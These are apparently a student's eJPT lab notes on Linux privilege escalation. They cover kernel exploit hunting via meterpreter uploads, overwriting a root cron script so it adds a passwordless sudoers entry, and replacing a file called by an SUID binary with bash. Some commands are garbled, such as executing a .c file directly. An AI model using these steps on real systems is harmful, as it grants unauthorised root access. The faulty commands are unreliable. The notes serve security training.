# 21 Linux Privilege Escalation

# Linux Kernel Exploits

Kernel exploits on Linux will typically target vulnerabilities in the Linux kernel to execute arbitrary code in order to run privileged system commands or to obtain a system shell.

Privilege escalation on Linux systems will typically follow the following methodology:
- Identifying kernel vulnerabilities.
- Downloading, compiling and transferring kernel exploits onto the target system.

**Tool**
linux-exploit-suggester 
	GitHub https://github.com/The-Z-Labs/linux-exploit-suggester

```shell
meterpreter: sysinfo
meterpreter: getuid
meterpreter: shell
	/bin/bash -i
meterpreter: cd /tmp 
meterpreter: upload /<path-to>/linux-exploit-suggester.sh
meterpreter: shell
	/bin/bash/ -i
	chmod +x linux-exploit-suggester.sh
	./linux-exploit-suggester.sh
www.exploit-db.com -> download selected exploit 
	follow the documentation

meterpreter: upload /<path-to>/payload.c
meterpreter: shell
	/bin/bash -i
	chmod +x payload.c
	./payload.c

sudo apt-get install gcc (gnu c compiler)
```

# Exploiting Misconfigured Cron Jobs

- Linux implements task scheduling through a utility called Cron.
- Cron is a time-based service that runs applications, scripts and other commands repeatedly on a specified schedule.
- An application, or script that has been configured to be run repeatedly with Cron is know as a Cron job. Cron can be used to automate or repeat a wide variety of functions on a system, from daily backups to system upgrades and patches.
- The crontab file is a configuration file that is used by the Cron utility to store and track Cron jobs that have been created. 
- Cron jobs can also be run as any user on the system, this is very important factor to keep an eye on as we will be targeting Cron jobs that have been configured to be run as the "root" user.
- This is primarily because, any script or command that is run by a Cron job will run as the root user and will consequently provide us with root access.
- In order to elevate our privileges, we will need to find and identify cron jobs scheduled by the root user or the files being processed by the cron job.

```shell
user: student 
pwd : /home/student
ls -la: message (only root can read)
grep -rnw /usr (typically where find shell scrips) -e "home/student/message"
	/usr/local/share/copy.sh:2:cp /home/student/message /tmp/message (can access here)
printf '#!/bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh>
```

# Exploiting SUID Binaries

- In addition to the three main access permissions (read, write and execute), Linux also provides users with specialized permissions that can be utilized in specific situations. One of these access permissions is the SUID (Set Owner User ID) permission.
- When applied, this permissions provides user with the ability to execute a script or binary with the permissions of the file owner as opposed to the user that is running the script or binary.
- SUID permissions are typically used to provide unprivileged users with the ability to run specific scripts or binaries with "root" permissions. It is to be noted, however, that the provision of elevate privileges is limited to the execution of the script and does not translate to elevation of privileges, however, if improperly configured unprivileged users can exploit misconfigurations or vulnerabilities whitin the binary or script to obtain an elevated session.
- This is the functionality that we will be attempting to exploit in order to elevate our privileges, however, the success of out attack will depend on the following factors:
	- Owner of the SUID binary - Given that we are attempting to elevate our privileges, we will only be exploiting SUID binaries that are owned by the "root" user or other privileges users.
	- Access permissions - We will require executable permissions in order to execute the SUID binary.

```shell
-r-x------ 1 root root 8296 Sep 22 2018 greetings
-rwsr-xr-x 1 root root 8344 Sep 22 2018 welcome (note the "s" in owner permission)

file welcome
strings welcome
rm greetings
cp /bin/bash greetings
./welcome
bash
```

#eJPT #cybersecurity 